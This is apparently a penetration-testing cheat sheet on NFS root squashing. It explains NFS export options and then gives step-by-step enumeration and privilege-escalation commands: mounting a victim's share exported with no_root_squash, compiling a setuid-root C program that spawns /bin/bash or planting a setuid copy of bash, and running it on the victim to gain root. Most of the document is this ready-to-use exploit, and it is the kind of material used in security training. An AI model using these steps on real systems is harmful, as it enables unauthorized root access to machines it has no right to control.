# NFS Root Squashing
Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.

- **rw:** Permit clients to read as well as write access to the shared directory.
- **ro:** Permit clients to Read-only access to shared directory.
- **root_squash:** This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account.
- **no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.**
- **async:** It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.
- **sync:** The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.

## 🔍Enumeration
### 🎯Victim
```
cat /etc/exports     # → Do we see any no_root_squash enabled on a mounted share?
# Output example: /tmp *(rw,sync,insecure,no_root_squash,no,subtree,check) 
```
### 💀Attacker
```
nmap -sV --script=nfs-showmount <victim_ip> 
```

## 📌Privilege Escalation
### 💀Attacker
```
showmount -e <victim_ip>                      
mkdir /tmp/mount                                
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
gcc /tmp/mount/priv.c -o /tmp/mount/priv
chmod +s /tmp/mount/priv

#OR

showmount -e <victim_ip>   
mkdir /tmp/mount 
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```
```
# C Code:
#include <unistd.h>  // for setuid() and setgid()
#include <stdlib.h>  // for system()

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
### 🎯Victim
```
Victim

cd /tmp
./priv
id && whoami

#OR

cd /tmp
./bash -p
id && whoami
```
